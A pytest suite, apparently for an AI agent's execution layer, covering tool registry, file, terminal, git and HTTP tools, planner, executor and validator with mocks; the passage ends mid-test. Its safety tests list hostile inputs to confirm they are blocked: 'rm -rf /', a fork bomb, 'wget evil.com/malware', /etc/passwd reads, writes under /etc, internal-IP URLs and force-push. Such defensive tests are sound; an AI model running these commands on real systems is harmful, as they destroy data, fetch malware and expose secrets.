"""
Unit Tests for Agent Hands — Execution Layer

Tests tool registry, code tool, terminal tool, exec memory, planner, executor, validator.
No API calls — all tests use local data, temp directories, and mocks.

Run:
    python -m pytest tests/test_hands.py -v
"""

import json
import os
import shutil
import tempfile
from datetime import datetime, timezone
from unittest.mock import patch, MagicMock

import pytest
import sys

# Ensure project root is on path
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))


# ============================================================
# Fixtures
# ============================================================

@pytest.fixture
def tmp_workspace(tmp_path):
    """Create a temporary workspace directory."""
    ws = str(tmp_path / "workspace")
    os.makedirs(ws)
    return ws


@pytest.fixture
def tmp_exec_memory(tmp_path):
    """Create a temporary exec memory directory."""
    mem_dir = str(tmp_path / "exec_memory")
    os.makedirs(mem_dir)
    with patch("hands.exec_memory.EXEC_MEMORY_DIR", mem_dir):
        yield mem_dir


@pytest.fixture
def tmp_strategy(tmp_path):
    """Create a temporary strategy directory."""
    strat_dir = str(tmp_path / "strategies")
    os.makedirs(strat_dir)
    with patch("strategy_store.STRATEGY_DIR", strat_dir):
        yield strat_dir


@pytest.fixture
def sample_plan():
    """A sample execution plan."""
    return {
        "task_summary": "Create a hello world Python script with tests",
        "steps": [
            {
                "step_number": 1,
                "description": "Create the main script",
                "tool": "code",
                "params": {"action": "write", "path": "/tmp/test_app/hello.py", "content": "print('hello')"},
                "depends_on": [],
                "expected_output": "File created",
            },
            {
                "step_number": 2,
                "description": "Run the script",
                "tool": "terminal",
                "params": {"command": "python /tmp/test_app/hello.py"},
                "depends_on": [1],
                "expected_output": "hello",
            },
        ],
        "success_criteria": "Script runs and prints hello",
        "estimated_complexity": "low",
        "risks": [],
    }


@pytest.fixture
def sample_execution_report():
    """A sample execution report."""
    return {
        "success": True,
        "task_summary": "Create a hello world Python script",
        "step_results": [
            {
                "step": 1,
                "tool": "code",
                "success": True,
                "output": "Wrote 15 bytes to hello.py",
                "error": "",
                "artifacts": ["hello.py"],
            },
            {
                "step": 2,
                "tool": "terminal",
                "success": True,
                "output": "hello",
                "error": "",
                "artifacts": [],
            },
        ],
        "artifacts": ["hello.py"],
        "completed_steps": 2,
        "failed_steps": 0,
        "total_steps": 2,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


@pytest.fixture
def sample_validation():
    """A sample validation result."""
    return {
        "scores": {
            "correctness": 8,
            "completeness": 7,
            "code_quality": 6,
            "security": 9,
            "kb_alignment": 7,
        },
        "overall_score": 7.4,
        "strengths": ["Code runs correctly", "Clean structure"],
        "weaknesses": ["No error handling", "No docstrings"],
        "actionable_feedback": "Add error handling and docstrings",
        "verdict": "accept",
        "critical_issues": [],
    }


# ============================================================
# Tool Registry Tests
# ============================================================

class TestToolRegistry:
    def test_create_default_registry(self):
        """Default registry has code and terminal tools."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        assert "code" in registry.list_tools()
        assert "terminal" in registry.list_tools()

    def test_register_and_get(self):
        """Can register and retrieve tools."""
        from hands.tools.registry import ToolRegistry, BaseTool, ToolResult

        class MockTool(BaseTool):
            name = "mock"
            description = "A mock tool"
            def execute(self, **kwargs):
                return ToolResult(success=True, output="mock output")

        registry = ToolRegistry()
        registry.register(MockTool())
        assert registry.get("mock") is not None
        assert registry.get("nonexistent") is None

    def test_duplicate_registration_raises(self):
        """Duplicate tool names raise ValueError."""
        from hands.tools.registry import ToolRegistry, BaseTool, ToolResult

        class MockTool(BaseTool):
            name = "mock"
            description = "A mock tool"
            def execute(self, **kwargs):
                return ToolResult(success=True)

        registry = ToolRegistry()
        registry.register(MockTool())
        with pytest.raises(ValueError, match="already registered"):
            registry.register(MockTool())

    def test_get_required_raises(self):
        """get_required raises KeyError for missing tools."""
        from hands.tools.registry import ToolRegistry
        registry = ToolRegistry()
        with pytest.raises(KeyError, match="not found"):
            registry.get_required("nonexistent")

    def test_execute_unknown_tool(self):
        """Executing unknown tool returns failure ToolResult."""
        from hands.tools.registry import ToolRegistry
        registry = ToolRegistry()
        result = registry.execute("nonexistent")
        assert not result.success
        assert "not found" in result.error

    def test_tool_descriptions(self):
        """get_tool_descriptions returns formatted string."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        desc = registry.get_tool_descriptions()
        assert "code" in desc
        assert "terminal" in desc

    def test_claude_tools_format(self):
        """get_claude_tools returns valid tool definitions."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        tools = registry.get_claude_tools()
        assert len(tools) >= 2
        for tool in tools:
            assert "name" in tool
            assert "description" in tool
            assert "input_schema" in tool

    def test_tool_result_to_dict(self):
        """ToolResult serializes correctly."""
        from hands.tools.registry import ToolResult
        result = ToolResult(
            success=True,
            output="test output",
            error="",
            artifacts=["file.py"],
            metadata={"action": "write"},
        )
        d = result.to_dict()
        assert d["success"] is True
        assert d["output"] == "test output"
        assert d["artifacts"] == ["file.py"]
        assert "timestamp" in d

    def test_tool_result_output_cap(self):
        """ToolResult caps output in serialized form."""
        from hands.tools.registry import ToolResult
        result = ToolResult(success=True, output="x" * 10000)
        d = result.to_dict()
        assert len(d["output"]) <= 5000

    def test_safe_execute_catches_exceptions(self):
        """safe_execute wraps exceptions in ToolResult."""
        from hands.tools.registry import BaseTool, ToolResult

        class BrokenTool(BaseTool):
            name = "broken"
            description = "Always fails"
            def execute(self, **kwargs):
                raise RuntimeError("boom")

        tool = BrokenTool()
        result = tool.safe_execute()
        assert not result.success
        assert "boom" in result.error

    def test_safe_execute_validates(self):
        """safe_execute runs validate_params first."""
        from hands.tools.registry import BaseTool, ToolResult

        class StrictTool(BaseTool):
            name = "strict"
            description = "Validates params"
            def validate_params(self, **kwargs):
                if "required" not in kwargs:
                    return "required param missing"
                return None
            def execute(self, **kwargs):
                return ToolResult(success=True)

        tool = StrictTool()
        result = tool.safe_execute()
        assert not result.success
        assert "Validation failed" in result.error

        result = tool.safe_execute(required=True)
        assert result.success


# ============================================================
# Code Tool Tests
# ============================================================

class TestCodeTool:
    def test_write_and_read(self, tmp_workspace):
        """Write a file then read it back."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        path = os.path.join(tmp_workspace, "test.py")

        # Write
        result = tool.safe_execute(action="write", path=path, content="hello world")
        assert result.success
        assert path in result.artifacts

        # Read
        result = tool.safe_execute(action="read", path=path)
        assert result.success
        assert "hello world" in result.output

    def test_edit(self, tmp_workspace):
        """Edit replaces a unique string in a file."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        path = os.path.join(tmp_workspace, "edit.py")

        tool.safe_execute(action="write", path=path, content="old_value = 1\nx = 2")
        result = tool.safe_execute(
            action="edit", path=path,
            old_string="old_value = 1", content="new_value = 42",
        )
        assert result.success

        result = tool.safe_execute(action="read", path=path)
        assert "new_value = 42" in result.output
        assert "old_value" not in result.output

    def test_edit_not_found(self, tmp_workspace):
        """Edit fails if string not found."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        path = os.path.join(tmp_workspace, "edit2.py")
        tool.safe_execute(action="write", path=path, content="hello")

        result = tool.safe_execute(
            action="edit", path=path,
            old_string="nonexistent", content="replacement",
        )
        assert not result.success
        assert "not found" in result.error

    def test_edit_ambiguous(self, tmp_workspace):
        """Edit fails if string matches multiple times."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        path = os.path.join(tmp_workspace, "ambig.py")
        tool.safe_execute(action="write", path=path, content="x = 1\nx = 1\n")

        result = tool.safe_execute(
            action="edit", path=path,
            old_string="x = 1", content="x = 2",
        )
        assert not result.success
        assert "2 times" in result.error

    def test_append(self, tmp_workspace):
        """Append adds content to end of file."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        path = os.path.join(tmp_workspace, "append.py")
        tool.safe_execute(action="write", path=path, content="line1\n")
        tool.safe_execute(action="append", path=path, content="line2\n")

        result = tool.safe_execute(action="read", path=path)
        assert "line1" in result.output
        assert "line2" in result.output

    def test_delete(self, tmp_workspace):
        """Delete removes a file."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        path = os.path.join(tmp_workspace, "delete_me.py")
        tool.safe_execute(action="write", path=path, content="temp")
        assert os.path.exists(path)

        result = tool.safe_execute(action="delete", path=path)
        assert result.success
        assert not os.path.exists(path)

    def test_list_dir(self, tmp_workspace):
        """list_dir shows directory contents."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        tool.safe_execute(action="write", path=os.path.join(tmp_workspace, "a.py"), content="a")
        tool.safe_execute(action="write", path=os.path.join(tmp_workspace, "b.py"), content="b")

        result = tool.safe_execute(action="list_dir", path=tmp_workspace)
        assert result.success
        assert "a.py" in result.output
        assert "b.py" in result.output

    def test_read_nonexistent(self):
        """Reading nonexistent file returns failure."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        result = tool.safe_execute(action="read", path="/nonexistent/file.py")
        assert not result.success

    def test_write_creates_dirs(self, tmp_workspace):
        """Write creates intermediate directories."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        path = os.path.join(tmp_workspace, "deep", "nested", "file.py")
        result = tool.safe_execute(action="write", path=path, content="nested")
        assert result.success
        assert os.path.exists(path)

    def test_system_dir_blocked(self):
        """Cannot write to system directories."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        result = tool.safe_execute(action="write", path="/etc/evil.conf", content="bad")
        assert not result.success
        assert "system directory" in result.error.lower() or "Validation failed" in result.error

    def test_validation_missing_action(self):
        """Validation catches missing action."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        result = tool.safe_execute(path="/tmp/test.py")
        assert not result.success

    def test_validation_missing_content(self):
        """Validation catches missing content for write."""
        from hands.tools.code import CodeTool
        tool = CodeTool()
        result = tool.safe_execute(action="write", path="/tmp/test.py")
        assert not result.success
        assert "content is required" in result.error


# ============================================================
# Terminal Tool Tests
# ============================================================

class TestTerminalTool:
    def test_echo(self):
        """Basic echo command works."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        result = tool.safe_execute(command="echo hello")
        assert result.success
        assert "hello" in result.output

    def test_command_failure(self):
        """Non-zero exit code returns failure."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        result = tool.safe_execute(command="ls /nonexistent_dir_xyz")
        assert not result.success
        assert result.metadata.get("exit_code") != 0

    def test_blocked_pattern(self):
        """Blocked patterns are rejected."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        result = tool.safe_execute(command="sudo rm -rf /")
        assert not result.success
        assert "Blocked" in result.error or "Validation failed" in result.error

    def test_cwd(self, tmp_workspace):
        """Custom working directory works."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        # Use 'ls' which is in the allowed commands list
        # Create a marker file to verify cwd
        marker = os.path.join(tmp_workspace, "marker.txt")
        with open(marker, "w") as f:
            f.write("test")
        result = tool.safe_execute(command="ls", cwd=tmp_workspace)
        assert result.success
        assert "marker.txt" in result.output

    def test_timeout(self):
        """Commands that exceed timeout are killed."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        # Disable sandbox for this test so we can use sleep
        with patch("hands.tools.terminal.EXEC_SANDBOX_MODE", False):
            result = tool.safe_execute(command="sleep 10", timeout=1)
        assert not result.success
        assert "timed out" in result.error.lower()

    def test_validation_empty_command(self):
        """Empty command is rejected."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        result = tool.safe_execute(command="")
        assert not result.success

    def test_invalid_cwd(self):
        """Invalid working directory is rejected."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        result = tool.safe_execute(command="echo hi", cwd="/nonexistent_dir_xyz")
        assert not result.success

    def test_pipe_commands(self):
        """Pipe commands work."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        result = tool.safe_execute(command="echo 'hello world' | grep hello")
        assert result.success
        assert "hello" in result.output

    def test_command_chaining(self):
        """Chained commands with && work."""
        from hands.tools.terminal import TerminalTool
        tool = TerminalTool()
        result = tool.safe_execute(command="echo one && echo two")
        assert result.success
        assert "one" in result.output
        assert "two" in result.output


# ============================================================
# Exec Memory Tests
# ============================================================

class TestExecMemory:
    def test_save_and_load(self, tmp_exec_memory, sample_plan, sample_execution_report, sample_validation):
        """Save an execution output and load it back."""
        from hands.exec_memory import save_exec_output, load_exec_outputs

        filepath = save_exec_output(
            domain="test-domain",
            goal="Build a test app",
            plan=sample_plan,
            execution_report=sample_execution_report,
            validation=sample_validation,
            attempt=1,
            strategy_version="v001",
        )
        assert os.path.exists(filepath)

        outputs = load_exec_outputs("test-domain")
        assert len(outputs) == 1
        assert outputs[0]["goal"] == "Build a test app"
        assert outputs[0]["overall_score"] == 7.4

    def test_load_empty_domain(self, tmp_exec_memory):
        """Loading from nonexistent domain returns empty list."""
        from hands.exec_memory import load_exec_outputs
        assert load_exec_outputs("nonexistent") == []

    def test_min_score_filter(self, tmp_exec_memory, sample_plan, sample_execution_report, sample_validation):
        """min_score filters outputs correctly."""
        from hands.exec_memory import save_exec_output, load_exec_outputs

        # Save a high-score output
        save_exec_output("test", "goal1", sample_plan, sample_execution_report, sample_validation, 1, "v001")

        # Save a low-score output
        low_val = {**sample_validation, "overall_score": 3.0}
        save_exec_output("test", "goal2", sample_plan, sample_execution_report, low_val, 1, "v001")

        all_outputs = load_exec_outputs("test")
        assert len(all_outputs) == 2

        high_only = load_exec_outputs("test", min_score=5.0)
        assert len(high_only) == 1
        assert high_only[0]["goal"] == "goal1"

    def test_get_exec_stats(self, tmp_exec_memory, sample_plan, sample_execution_report, sample_validation):
        """get_exec_stats computes correct aggregates."""
        from hands.exec_memory import save_exec_output, get_exec_stats

        save_exec_output("stats-test", "g1", sample_plan, sample_execution_report, sample_validation, 1, "v001")

        low_val = {**sample_validation, "overall_score": 5.0, "verdict": "reject"}
        low_report = {**sample_execution_report, "artifacts": ["a.py", "b.py"]}
        save_exec_output("stats-test", "g2", sample_plan, low_report, low_val, 1, "v001")

        stats = get_exec_stats("stats-test")
        assert stats["count"] == 2
        assert 6.0 <= stats["avg_score"] <= 6.5  # (7.4 + 5.0) / 2 = 6.2
        assert stats["accepted"] == 1
        assert stats["rejected"] == 1

    def test_get_exec_stats_empty(self, tmp_exec_memory):
        """Stats for empty domain returns zeros."""
        from hands.exec_memory import get_exec_stats
        stats = get_exec_stats("empty")
        assert stats["count"] == 0
        assert stats["avg_score"] == 0

    def test_get_recent_exec_outputs(self, tmp_exec_memory, sample_plan, sample_execution_report, sample_validation):
        """get_recent returns last N outputs."""
        from hands.exec_memory import save_exec_output, get_recent_exec_outputs
        import time

        for i in range(5):
            save_exec_output("recent-test", f"goal-{i}", sample_plan, sample_execution_report, sample_validation, 1, "v001")
            time.sleep(0.01)  # Ensure unique timestamps

        recent = get_recent_exec_outputs("recent-test", n=3)
        assert len(recent) == 3
        assert recent[-1]["goal"] == "goal-4"


# ============================================================
# Planner Tests (mocked API)
# ============================================================

class TestPlanner:
    def test_plan_success(self):
        """Planner returns structured plan when model responds correctly."""
        from hands.planner import plan

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 200
        mock_response.content = [MagicMock(text=json.dumps({
            "task_summary": "Create a hello world script",
            "steps": [
                {
                    "step_number": 1,
                    "description": "Write hello.py",
                    "tool": "code",
                    "params": {"action": "write", "path": "hello.py", "content": "print('hello')"},
                    "depends_on": [],
                    "expected_output": "File written",
                }
            ],
            "success_criteria": "File exists and runs",
            "estimated_complexity": "low",
            "risks": [],
        }))]

        with patch("hands.planner.create_message", return_value=mock_response), \
             patch("hands.planner.log_cost"):
            result = plan(
                goal="Create hello world",
                tools_description="code: file operations",
            )

        assert result is not None
        assert result["task_summary"] == "Create a hello world script"
        assert len(result["steps"]) == 1

    def test_plan_failure_returns_none(self):
        """Planner returns None when model output is unparseable."""
        from hands.planner import plan

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 50
        mock_response.content = [MagicMock(text="I can't do that, Dave.")]

        with patch("hands.planner.create_message", return_value=mock_response), \
             patch("hands.planner.log_cost"):
            result = plan(goal="Impossible task", tools_description="none")

        assert result is None

    def test_plan_caps_steps(self):
        """Planner caps steps to EXEC_MAX_STEPS."""
        from hands.planner import plan

        # Create a plan with 30 steps
        steps = [
            {"step_number": i, "tool": "code", "params": {}, "description": f"step {i}"}
            for i in range(30)
        ]
        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 200
        mock_response.content = [MagicMock(text=json.dumps({
            "task_summary": "Big plan",
            "steps": steps,
            "success_criteria": "all done",
        }))]

        with patch("hands.planner.create_message", return_value=mock_response), \
             patch("hands.planner.log_cost"), \
             patch("hands.planner.EXEC_MAX_STEPS", 20):
            result = plan(goal="Big task", tools_description="code")

        assert result is not None
        assert len(result["steps"]) == 20

    def test_plan_defaults_missing_fields(self):
        """Planner fills in defaults for missing step fields."""
        from hands.planner import plan

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 50
        mock_response.usage.output_tokens = 100
        mock_response.content = [MagicMock(text=json.dumps({
            "task_summary": "Minimal plan",
            "steps": [{"tool": "code"}],  # missing most fields
        }))]

        with patch("hands.planner.create_message", return_value=mock_response), \
             patch("hands.planner.log_cost"):
            result = plan(goal="Test", tools_description="code")

        assert result is not None
        step = result["steps"][0]
        assert step["step_number"] == 1
        assert step["depends_on"] == []
        assert step["description"] == ""


# ============================================================
# Executor Tests (mocked API)
# ============================================================

class TestExecutor:
    def test_execute_plan_success(self, sample_plan):
        """Executor successfully executes a simple plan."""
        from hands.executor import execute_plan
        from hands.tools.registry import ToolRegistry, BaseTool, ToolResult

        # Create mock registry
        class MockCodeTool(BaseTool):
            name = "code"
            description = "mock code"
            def execute(self, **kwargs):
                return ToolResult(success=True, output="Wrote file", artifacts=["hello.py"])

        class MockTerminalTool(BaseTool):
            name = "terminal"
            description = "mock terminal"
            def execute(self, **kwargs):
                return ToolResult(success=True, output="hello")

        registry = ToolRegistry()
        registry.register(MockCodeTool())
        registry.register(MockTerminalTool())

        # Mock the model to return execute_tool then complete
        call_count = {"n": 0}
        def mock_create(*args, **kwargs):
            call_count["n"] += 1
            resp = MagicMock()
            resp.usage.input_tokens = 50
            resp.usage.output_tokens = 100
            if call_count["n"] == 1:
                resp.content = [MagicMock(text=json.dumps({
                    "action": "execute_tool",
                    "tool": "code",
                    "params": {"action": "write", "path": "hello.py", "content": "print('hello')"},
                    "reasoning": "Create the script",
                }))]
            elif call_count["n"] == 2:
                resp.content = [MagicMock(text=json.dumps({
                    "action": "execute_tool",
                    "tool": "terminal",
                    "params": {"command": "python hello.py"},
                    "reasoning": "Run the script",
                }))]
            else:
                resp.content = [MagicMock(text=json.dumps({
                    "action": "complete",
                    "summary": "Script created and tested",
                    "artifacts": ["hello.py"],
                }))]
            return resp

        with patch("hands.executor.create_message", side_effect=mock_create), \
             patch("hands.executor.log_cost"):
            report = execute_plan(sample_plan, registry)

        assert report["success"]
        assert report["completed_steps"] == 2
        assert report["failed_steps"] == 0
        assert "hello.py" in report["artifacts"]

    def test_execute_plan_empty(self):
        """Empty plan returns failure."""
        from hands.executor import execute_plan
        from hands.tools.registry import ToolRegistry

        registry = ToolRegistry()
        report = execute_plan({"steps": []}, registry)
        assert not report["success"]
        assert "no steps" in report["error"].lower()

    def test_execute_plan_abort(self, sample_plan):
        """Executor handles abort action."""
        from hands.executor import execute_plan
        from hands.tools.registry import ToolRegistry

        registry = ToolRegistry()

        mock_resp = MagicMock()
        mock_resp.usage.input_tokens = 50
        mock_resp.usage.output_tokens = 100
        mock_resp.content = [MagicMock(text=json.dumps({
            "action": "abort",
            "reason": "Cannot proceed without database",
            "completed_steps": 0,
        }))]

        with patch("hands.executor.create_message", return_value=mock_resp), \
             patch("hands.executor.log_cost"):
            report = execute_plan(sample_plan, registry)

        assert not report["success"]
        assert "abort" in report["error"].lower()


# ============================================================
# Validator Tests (mocked API)
# ============================================================

class TestValidator:
    def test_validate_success(self, sample_plan, sample_execution_report):
        """Validator produces structured scores."""
        from hands.validator import validate_execution

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 150
        mock_response.content = [MagicMock(text=json.dumps({
            "scores": {
                "correctness": 8,
                "completeness": 7,
                "code_quality": 6,
                "security": 9,
                "kb_alignment": 7,
            },
            "overall_score": 7.4,
            "strengths": ["Works correctly"],
            "weaknesses": ["No error handling"],
            "actionable_feedback": "Add try/except blocks",
            "verdict": "accept",
            "critical_issues": [],
        }))]

        with patch("hands.validator.create_message", return_value=mock_response), \
             patch("hands.validator.log_cost"):
            result = validate_execution(
                goal="Build hello world",
                plan=sample_plan,
                execution_report=sample_execution_report,
            )

        assert result["overall_score"] == 7.4
        assert result["verdict"] == "accept"
        assert len(result["scores"]) == 5

    def test_validate_parse_failure(self, sample_plan, sample_execution_report):
        """Validator handles parse failures gracefully."""
        from hands.validator import validate_execution

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 50
        mock_response.usage.output_tokens = 50
        mock_response.content = [MagicMock(text="This is not JSON at all")]

        with patch("hands.validator.create_message", return_value=mock_response), \
             patch("hands.validator.log_cost"):
            result = validate_execution(
                goal="Build something",
                plan=sample_plan,
                execution_report=sample_execution_report,
            )

        assert result["verdict"] == "reject"
        assert result.get("_parse_error")


# ============================================================
# Command Safety Tests
# ============================================================

class TestCommandSafety:
    def test_blocked_sudo(self):
        """sudo commands are blocked."""
        from hands.tools.terminal import _check_command_safety
        assert _check_command_safety("sudo apt install evil") is not None

    def test_blocked_rm_rf(self):
        """rm -rf / is blocked."""
        from hands.tools.terminal import _check_command_safety
        assert _check_command_safety("rm -rf /") is not None

    def test_blocked_fork_bomb(self):
        """Fork bomb is blocked."""
        from hands.tools.terminal import _check_command_safety
        assert _check_command_safety(":(){ :|:& };:") is not None

    def test_allowed_echo(self):
        """echo is allowed in sandbox mode."""
        from hands.tools.terminal import _check_command_safety
        with patch("hands.tools.terminal.EXEC_SANDBOX_MODE", True), \
             patch("hands.tools.terminal.EXEC_ALLOWED_COMMANDS", ["echo"]):
            assert _check_command_safety("echo hello") is None

    def test_sandbox_blocks_unknown(self):
        """Sandbox mode blocks non-whitelisted commands."""
        from hands.tools.terminal import _check_command_safety
        with patch("hands.tools.terminal.EXEC_SANDBOX_MODE", True), \
             patch("hands.tools.terminal.EXEC_ALLOWED_COMMANDS", ["echo", "ls"]):
            assert _check_command_safety("wget evil.com/malware") is not None


# ============================================================
# File Safety Tests
# ============================================================

class TestFileSafety:
    def test_system_dirs_blocked(self):
        """System directories are always blocked."""
        from hands.tools.code import _is_safe_path
        assert _is_safe_path("/etc/passwd") is not None
        assert _is_safe_path("/usr/bin/python") is not None
        assert _is_safe_path("/boot/vmlinuz") is not None

    def test_normal_paths_allowed(self, tmp_workspace):
        """Normal workspace paths are allowed."""
        from hands.tools.code import _is_safe_path
        path = os.path.join(tmp_workspace, "test.py")
        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", None):
            assert _is_safe_path(path) is None

    def test_allowed_dirs_whitelist(self, tmp_workspace):
        """When EXEC_ALLOWED_DIRS is set, only those dirs are allowed."""
        from hands.tools.code import _is_safe_path
        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            # Inside allowed dir — OK
            assert _is_safe_path(os.path.join(tmp_workspace, "test.py")) is None
            # Outside allowed dir — blocked
            assert _is_safe_path("/tmp/outside.py") is not None


# ============================================================
# Exec Meta-Analyst Tests
# ============================================================

class TestExecMeta:
    def test_not_enough_data(self, tmp_exec_memory):
        """Meta-analyst skips when not enough data."""
        from hands.exec_meta import analyze_and_evolve_exec
        result = analyze_and_evolve_exec("empty-domain")
        assert result is None

    def test_evolution_log(self, tmp_path):
        """Evolution log saves and loads correctly."""
        from hands.exec_meta import load_exec_evolution_log, _save_exec_evolution_entry

        strat_dir = str(tmp_path / "strategies")
        os.makedirs(strat_dir)

        with patch("hands.exec_meta.STRATEGY_DIR", strat_dir):
            _save_exec_evolution_entry("test", {
                "version": "v001",
                "changes": ["added tests"],
            })

            log = load_exec_evolution_log("test")
            assert len(log) == 1
            assert log[0]["version"] == "v001"

            # Append another
            _save_exec_evolution_entry("test", {
                "version": "v002",
                "changes": ["improved quality"],
            })

            log = load_exec_evolution_log("test")
            assert len(log) == 2


# ============================================================
# Integration: Registry + Tool Execution
# ============================================================

class TestRegistryIntegration:
    def test_registry_execute_code_write(self, tmp_workspace):
        """Registry.execute routes to code tool correctly."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()

        path = os.path.join(tmp_workspace, "integration.py")
        result = registry.execute("code", action="write", path=path, content="# integration test")
        assert result.success
        assert os.path.exists(path)

    def test_registry_execute_terminal(self):
        """Registry.execute routes to terminal tool correctly."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()

        result = registry.execute("terminal", command="echo integration_test")
        assert result.success
        assert "integration_test" in result.output


# ============================================================
# Git Tool Tests
# ============================================================

class TestGitTool:
    def test_git_init(self, tmp_workspace):
        """Git init creates a repository."""
        from hands.tools.git import GitTool
        tool = GitTool()
        result = tool.safe_execute(action="init", path=tmp_workspace)
        assert result.success
        assert os.path.isdir(os.path.join(tmp_workspace, ".git"))

    def test_git_status(self, tmp_workspace):
        """Git status works on an initialized repo."""
        from hands.tools.git import GitTool
        import subprocess
        subprocess.run(["git", "init"], cwd=tmp_workspace, capture_output=True)

        tool = GitTool()
        result = tool.safe_execute(action="status", path=tmp_workspace)
        assert result.success

    def test_git_add_and_commit(self, tmp_workspace):
        """Git add + commit works."""
        from hands.tools.git import GitTool
        import subprocess
        subprocess.run(["git", "init"], cwd=tmp_workspace, capture_output=True)

        # Create a file
        with open(os.path.join(tmp_workspace, "test.txt"), "w") as f:
            f.write("hello")

        tool = GitTool()
        # Add
        result = tool.safe_execute(action="add", path=tmp_workspace)
        assert result.success

        # Commit
        result = tool.safe_execute(action="commit", path=tmp_workspace, message="Initial commit")
        assert result.success
        assert "Initial commit" in result.output or "1 file changed" in result.output

    def test_git_log(self, tmp_workspace):
        """Git log shows commits."""
        from hands.tools.git import GitTool
        import subprocess
        subprocess.run(["git", "init"], cwd=tmp_workspace, capture_output=True)
        with open(os.path.join(tmp_workspace, "test.txt"), "w") as f:
            f.write("hello")
        subprocess.run(["git", "add", "."], cwd=tmp_workspace, capture_output=True)
        subprocess.run(
            ["git", "commit", "-m", "test log"],
            cwd=tmp_workspace, capture_output=True,
            env={**os.environ, "GIT_AUTHOR_NAME": "Test", "GIT_AUTHOR_EMAIL": "t@t.com",
                 "GIT_COMMITTER_NAME": "Test", "GIT_COMMITTER_EMAIL": "t@t.com"},
        )

        tool = GitTool()
        result = tool.safe_execute(action="log", path=tmp_workspace)
        assert result.success
        assert "test log" in result.output

    def test_git_branch(self, tmp_workspace):
        """Git branch creation works."""
        from hands.tools.git import GitTool
        import subprocess
        subprocess.run(["git", "init"], cwd=tmp_workspace, capture_output=True)
        with open(os.path.join(tmp_workspace, "test.txt"), "w") as f:
            f.write("hello")
        subprocess.run(["git", "add", "."], cwd=tmp_workspace, capture_output=True)
        subprocess.run(
            ["git", "commit", "-m", "init"],
            cwd=tmp_workspace, capture_output=True,
            env={**os.environ, "GIT_AUTHOR_NAME": "Test", "GIT_AUTHOR_EMAIL": "t@t.com",
                 "GIT_COMMITTER_NAME": "Test", "GIT_COMMITTER_EMAIL": "t@t.com"},
        )

        tool = GitTool()
        result = tool.safe_execute(action="branch", path=tmp_workspace, branch_name="feature-test")
        assert result.success

    def test_git_safety_blocks_force_push(self):
        """Blocked git operations are rejected."""
        from hands.tools.git import _check_git_safety
        assert _check_git_safety("push --force origin main") is not None
        assert _check_git_safety("rebase main") is not None
        assert _check_git_safety("reset --hard HEAD~1") is not None

    def test_git_safety_allows_normal(self):
        """Normal git operations are allowed."""
        from hands.tools.git import _check_git_safety
        assert _check_git_safety("push origin main") is None
        assert _check_git_safety("pull origin main") is None
        assert _check_git_safety("commit -m 'test'") is None

    def test_git_requires_message_for_commit(self):
        """Commit without message returns validation error."""
        from hands.tools.git import GitTool
        tool = GitTool()
        result = tool.safe_execute(action="commit", path="/tmp")
        assert not result.success
        assert "message" in result.error.lower()

    def test_git_diff(self, tmp_workspace):
        """Git diff shows changes."""
        from hands.tools.git import GitTool
        import subprocess
        subprocess.run(["git", "init"], cwd=tmp_workspace, capture_output=True)
        with open(os.path.join(tmp_workspace, "test.txt"), "w") as f:
            f.write("hello")
        subprocess.run(["git", "add", "."], cwd=tmp_workspace, capture_output=True)
        subprocess.run(
            ["git", "commit", "-m", "init"],
            cwd=tmp_workspace, capture_output=True,
            env={**os.environ, "GIT_AUTHOR_NAME": "Test", "GIT_AUTHOR_EMAIL": "t@t.com",
                 "GIT_COMMITTER_NAME": "Test", "GIT_COMMITTER_EMAIL": "t@t.com"},
        )
        # Modify file
        with open(os.path.join(tmp_workspace, "test.txt"), "w") as f:
            f.write("world")

        tool = GitTool()
        result = tool.safe_execute(action="diff", path=tmp_workspace)
        assert result.success


# ============================================================
# HTTP Tool Tests
# ============================================================

class TestHttpTool:
    def test_url_safety_blocks_internal(self):
        """Internal IPs are blocked."""
        from hands.tools.http import _check_url_safety
        assert _check_url_safety("http://127.0.0.1/secret") is not None
        assert _check_url_safety("http://192.168.1.1/admin") is not None
        assert _check_url_safety("http://10.0.0.1/api") is not None
        assert _check_url_safety("http://localhost:3000") is not None

    def test_url_safety_allows_public(self):
        """Public URLs are allowed."""
        from hands.tools.http import _check_url_safety
        assert _check_url_safety("https://api.github.com/repos") is None
        assert _check_url_safety("https://example.com") is None

    def test_url_safety_blocks_file_scheme(self):
        """file:// scheme is blocked."""
        from hands.tools.http import _check_url_safety
        assert _check_url_safety("file:///etc/passwd") is not None

    def test_http_requires_url(self):
        """HTTP tool validates required params."""
        from hands.tools.http import HttpTool
